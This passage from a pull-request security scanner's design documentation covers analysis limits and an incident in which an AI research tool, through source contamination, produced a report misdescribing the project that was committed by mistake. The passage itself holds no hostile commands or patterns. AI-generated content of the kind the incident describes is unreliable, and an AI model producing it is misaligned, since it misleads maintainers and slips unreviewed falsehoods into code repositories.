When no PR description is provided and the changeset is non-trivial (verdict ≠ SAFE), `UNVERIFIED` is surfaced as an explicit flag in `verdict["flags"]`.

### 9.6 Blob Size Cap and Partial Analysis

All blob reads are capped at 1 MB (`_MAX_BLOB_BYTES`). Source files larger than 1 MB are parsed against the first 1 MB only — structural nodes defined beyond that boundary are invisible to Layer 4. This is an intentional resource safety trade-off. Files over 1 MB in a source tree are rare and typically generated.

### 9.7 AI Research Tool Context Pollution is Out-of-Scope

PayloadGuard's threat model is a human submitting a destructive PR. It does not model the case where an AI assistant processing repository documents on a maintainer's behalf generates plausible-looking but hallucinated content that lands in version control via a direct commit.

A live incident (2026-04-24) demonstrated this vector — not through deliberate attack, but through accidental AI source contamination. NotebookLM was conducting legitimate research on this repository and pulled in unrelated external sources (AE3GIS MDPI paper, GitHub issues, MCP documentation), suffering source contamination and producing a report that described PayloadGuard as an ICS testbed. The output was committed to main unintentionally. PayloadGuard scored the commit as low-risk (pure file addition, no deletions). Human code review caught the mismatch.

INC-1 and INC-4 are closed — added file content scanning now catches CI trigger strings and shell execution patterns in added non-code files. INC-3 is closed — UNVERIFIED surfaces as a verdict flag on non-trivial changesets without PR descriptions. INC-2 (AI research tool source contamination per se) remains out of scope for static analysis; mitigated by human review.

---

*PayloadGuard — because AI doesn't feel bad about what it breaks.*
